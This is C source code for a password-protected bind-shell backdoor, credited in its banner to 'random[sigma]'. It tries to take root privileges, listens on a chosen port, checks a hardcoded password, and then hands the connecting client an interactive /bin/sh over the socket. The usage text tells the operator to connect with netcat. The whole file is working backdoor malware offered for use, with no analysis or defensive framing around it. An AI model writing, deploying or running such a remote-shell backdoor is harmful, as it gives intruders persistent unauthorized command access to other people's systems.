#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ENTERPASS "Enert your password: \0"
#define WELCOME "Welcome to shell\nlet's do it:\n"
#define PASSWORD "random"

int main(int argc, char **argv)
{
        struct sockaddr_in s_addr;
        struct sockaddr_in c_addr;
        char buf[1024];
        pid_t pid;
        int i,sock_descriptor,temp_sock_descriptor,c_addrsize;

        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);

        if (argc!=2){
                printf("=================================\r\n");
                printf("|bind.c by random[sigma]\r\n");
                printf("|Usage:\r\n");
                printf("|%s port\r\n",argv[0]);
                printf("|nc -vv IP port\r\n");
                printf("|enter the password to get shell\r\n");
                printf("|Have a nice day;)\r\n");
                printf("=================================\r\n");
                exit(1);

        }
        /*
        if (-1 == fork()){
                perror("fork!");
                exit(0);
        }
        */
        sock_descriptor=socket(AF_INET,SOCK_STREAM,0);
        if (socket(AF_INET,SOCK_STREAM,0)==-1){
                perror("socket failed!");
                exit(1);
        }
        memset(&s_addr,0,sizeof(s_addr));
        s_addr.sin_family=AF_INET;
        s_addr.sin_addr.s_addr=htonl(INADDR_ANY);
        s_addr.sin_port=htons(atoi(argv[1]));
        if (bind(sock_descriptor,(struct sockaddr *)&s_addr,sizeof(s_addr))==-1){
                perror("bind failed!");
                exit(1);
        }
        if (listen(sock_descriptor,20)==-1)//accept 20 connections
        {
                printf("listen failed!");
                exit(1);
        }
        c_addrsize=sizeof(c_addr);
        while(1){
                temp_sock_descriptor=accept(sock_descriptor,(struct sockaddr *)&c_addr,&c_addrsize);
                pid=fork();
                if (pid>0) {    //parent process
                        close(temp_sock_descriptor);
                        printf("client connect!\n");
                        continue;
                }else if (pid==0){//child process
                        write(temp_sock_descriptor, ENTERPASS, strlen(ENTERPASS));
                        memset(buf, '\0', 1024);
                        recv(temp_sock_descriptor, buf, 1024, 0);

                        if (strncmp(buf,PASSWORD,5) !=0){
                                close(temp_sock_descriptor);
                                exit(1);
                        }

                        write(temp_sock_descriptor, WELCOME, strlen(WELCOME));
                        dup2(temp_sock_descriptor,0);
                        dup2(temp_sock_descriptor,1);
                        dup2(temp_sock_descriptor,2);
                        execl("/bin/sh", "sh", (char *) 0);
                        close(temp_sock_descriptor);
                        exit(0);
                }else{  
                        perror("fork!");

                        exit(1);
                }
        }

        close(sock_descriptor);
        return 0;
}
